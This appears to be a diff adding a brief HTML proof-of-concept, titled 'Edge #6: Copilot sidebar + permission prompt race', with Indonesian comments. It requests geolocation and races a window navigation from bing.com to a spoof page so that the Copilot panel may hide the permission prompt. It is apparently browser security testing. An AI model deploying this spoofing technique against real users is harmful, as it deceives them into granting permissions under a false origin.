@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Edge Copilot Panel Spoof</title></head>
+<body>
+<h3>Edge #6: Copilot sidebar + permission prompt race</h3>
+<p>Klik tombol. Request permission + buka window navigasi. Copilot panel bisa nutupin prompt.</p>
+<button onclick="go()">Mulai</button>
+<script>
+function go(){
+  // Request permission (trigger prompt)
+  try {
+    navigator.geolocation.getCurrentPosition(function(){}, function(){});
+  } catch(e){}
+  // Buka window + navigasi bersamaan (race)
+  var w = window.open("https://www.bing.com/", "_blank");
+  setTimeout(function(){
+    try { w.location = "edge-spoof-target.html"; } catch(e){}
+  }, 400);
+}
+</script>
+</body>
+</html>
